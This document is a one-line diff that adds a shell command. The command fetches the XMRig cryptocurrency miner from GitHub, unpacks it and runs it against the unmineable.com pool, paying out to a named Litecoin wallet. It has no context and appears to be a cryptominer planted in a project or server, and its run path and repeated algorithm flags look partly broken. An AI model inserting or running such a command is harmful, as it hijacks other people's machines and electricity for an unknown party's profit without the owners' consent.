@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz && /xmrig-6.22.2 -a allium -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:ltc1qfjal2n2zr0p2azh8usstx4ktw6sfymz2urh92j.vps -p x
